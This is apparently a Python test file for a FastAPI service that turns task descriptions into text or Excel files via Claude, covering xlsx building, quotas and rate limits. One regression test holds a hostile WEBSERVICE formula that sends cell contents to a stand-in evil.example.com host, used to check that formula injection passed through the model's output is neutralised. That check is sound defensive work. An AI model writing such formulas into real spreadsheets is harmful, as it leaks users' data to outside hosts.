import io
from unittest.mock import patch
from urllib.parse import unquote

import openpyxl
from fastapi.testclient import TestClient

import app as app_module
import db
from app import app
from task_generator import build_xlsx_bytes, generate_task_spreadsheet, generate_task_text

client = TestClient(app)


# --- build_xlsx_bytes (純粋なロジック、API呼び出しなし) ---

def test_build_xlsx_bytes_writes_headers_and_rows():
    spec = {
        "filename": "テスト",
        "sheets": [
            {
                "name": "集計",
                "headers": ["月", "売上"],
                "rows": [["1月", 1000], ["2月", 2000]],
            }
        ],
    }

    raw = build_xlsx_bytes(spec)
    workbook = openpyxl.load_workbook(io.BytesIO(raw))

    assert workbook.sheetnames == ["集計"]
    sheet = workbook["集計"]
    assert [cell.value for cell in sheet[1]] == ["月", "売上"]
    assert [cell.value for cell in sheet[2]] == ["1月", 1000]
    assert [cell.value for cell in sheet[3]] == ["2月", 2000]


def test_build_xlsx_bytes_supports_multiple_sheets():
    spec = {
        "sheets": [
            {"name": "データ", "headers": ["a"], "rows": [[1]]},
            {"name": "集計", "headers": ["b"], "rows": [[2]]},
        ]
    }

    raw = build_xlsx_bytes(spec)
    workbook = openpyxl.load_workbook(io.BytesIO(raw))
    assert workbook.sheetnames == ["データ", "集計"]


def test_build_xlsx_bytes_sanitizes_invalid_sheet_name_chars():
    spec = {"sheets": [{"name": "a/b:c", "headers": [], "rows": []}]}
    raw = build_xlsx_bytes(spec)
    workbook = openpyxl.load_workbook(io.BytesIO(raw))
    assert workbook.sheetnames == ["abc"]


def test_build_xlsx_bytes_falls_back_when_no_sheets():
    raw = build_xlsx_bytes({})
    workbook = openpyxl.load_workbook(io.BytesIO(raw))
    assert workbook.sheetnames == ["Sheet1"]


def test_build_xlsx_bytes_preserves_formula_strings():
    spec = {"sheets": [{"name": "S", "headers": ["合計"], "rows": [["=SUM(A1:A1)"]]}]}
    raw = build_xlsx_bytes(spec)
    workbook = openpyxl.load_workbook(io.BytesIO(raw))
    assert workbook["S"]["A2"].value == "=SUM(A1:A1)"
    assert workbook["S"]["A2"].data_type == "f"


def test_build_xlsx_bytes_neutralizes_non_allowlisted_formulas():
    """Claudeの応答(=課題内容というユーザー入力を経由した間接的な攻撃)に紛れ込んだ
    数式インジェクションを防ぐ回帰テスト。SUM/AVERAGE等の単純な集計以外の"="始まり文字列は、
    実際のExcel数式としてではなく、先頭に"'"を付けた無害な文字列として書き込まれる。
    """
    dangerous = '=WEBSERVICE("http://evil.example.com/steal?data="&A1)'
    spec = {"sheets": [{"name": "S", "headers": [dangerous], "rows": [[dangerous, "普通のテキスト"]]}]}
    raw = build_xlsx_bytes(spec)
    workbook = openpyxl.load_workbook(io.BytesIO(raw))

    header_cell = workbook["S"]["A1"]
    row_cell = workbook["S"]["A2"]
    untouched_cell = workbook["S"]["B2"]

    assert header_cell.data_type == "s"  # "f"(数式)ではなく文字列として保存される
    assert header_cell.value == "'" + dangerous
    assert row_cell.data_type == "s"
    assert row_cell.value == "'" + dangerous
    assert untouched_cell.value == "普通のテキスト"  # "="始まりでない値は無変更


# --- generate_task_text / generate_task_spreadsheet(実際にClaude APIを呼ぶ) ---

def test_generate_task_text_returns_expected_shape():
    result = generate_task_text("江戸時代の身分制度について300字でまとめてください")
    assert set(["content", "_token_usage"]).issubset(result)
    assert result["content"]


def test_generate_task_spreadsheet_returns_expected_shape():
    result = generate_task_spreadsheet("4月から6月までの月別売上集計表を作ってください")
    assert set(["spec", "_token_usage"]).issubset(result)
    spec = result["spec"]
    assert spec.get("sheets")
    # 生成された仕様が実際に.xlsxへ組み立てられることも確認する
    build_xlsx_bytes(spec)


# --- POST /task-generator ---

def _fake_task_text(description, lang="ja"):
    return {"content": f"# 回答\n\n{description}についての内容です。", "_token_usage": {"input_tokens": 10, "output_tokens": 20}}


def _fake_task_spreadsheet(description, lang="ja"):
    return {
        "spec": {
            "filename": "生成結果",
            "sheets": [{"name": "Sheet1", "headers": ["項目"], "rows": [[description]]}],
        },
        "_token_usage": {"input_tokens": 15, "output_tokens": 25},
    }


def test_task_generator_text_returns_content():
    with patch("app.generate_task_text", side_effect=_fake_task_text):
        resp = client.post(
            "/task-generator",
            json={"description": "民法の要点をまとめて", "kind": "text"},
            headers={"X-Dev-User-Id": "task-gen-text-user"},
        )
    assert resp.status_code == 200
    body = resp.json()
    assert body["kind"] == "text"
    assert "民法の要点をまとめて" in body["content"]


def test_task_generator_excel_returns_xlsx_file():
    with patch("app.generate_task_spreadsheet", side_effect=_fake_task_spreadsheet):
        resp = client.post(
            "/task-generator",
            json={"description": "売上集計表", "kind": "excel"},
            headers={"X-Dev-User-Id": "task-gen-excel-user"},
        )
    assert resp.status_code == 200
    assert resp.headers["content-type"].startswith(
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    )
    assert "生成結果.xlsx" in unquote(resp.headers["content-disposition"])

    workbook = openpyxl.load_workbook(io.BytesIO(resp.content))
    assert workbook["Sheet1"]["A2"].value == "売上集計表"


def test_task_generator_rejects_empty_description():
    resp = client.post(
        "/task-generator",
        json={"description": "   ", "kind": "text"},
        headers={"X-Dev-User-Id": "task-gen-empty-user"},
    )
    assert resp.status_code == 400


def test_task_generator_rejects_invalid_kind():
    resp = client.post(
        "/task-generator",
        json={"description": "何かの課題", "kind": "pdf"},
        headers={"X-Dev-User-Id": "task-gen-invalid-kind-user"},
    )
    assert resp.status_code == 400


def test_task_generator_blocked_with_402_when_quota_exceeded(monkeypatch):
    monkeypatch.setattr(app_module, "PLAN_TOKEN_QUOTAS", {"free": 10, "pro": 200_000, "max": 1_000_000})
    db.add_token_usage("task-gen-quota-user", 999)

    resp = client.post(
        "/task-generator",
        json={"description": "枠を使い切った後の課題", "kind": "text"},
        headers={"X-Dev-User-Id": "task-gen-quota-user"},
    )
    assert resp.status_code == 402


def test_task_generator_increments_usage():
    headers = {"X-Dev-User-Id": "task-gen-usage-user"}
    before = db.get_or_create_entitlement("task-gen-usage-user")["tokens_used"]

    with patch("app.generate_task_text", side_effect=_fake_task_text):
        resp = client.post(
            "/task-generator", json={"description": "課題内容", "kind": "text"}, headers=headers
        )
    assert resp.status_code == 200

    after = db.get_or_create_entitlement("task-gen-usage-user")["tokens_used"]
    assert after == before + 30


def test_task_generator_rate_limit_returns_429_when_exceeded(monkeypatch):
    monkeypatch.setattr(app_module, "TASK_GENERATOR_RATE_LIMIT_PER_MINUTE", 1)
    headers = {"X-Dev-User-Id": "task-gen-rate-limit-user"}

    with patch("app.generate_task_text", side_effect=_fake_task_text):
        first = client.post(
            "/task-generator", json={"description": "1件目", "kind": "text"}, headers=headers
        )
        assert first.status_code == 200

        second = client.post(
            "/task-generator", json={"description": "2件目", "kind": "text"}, headers=headers
        )
        assert second.status_code == 429
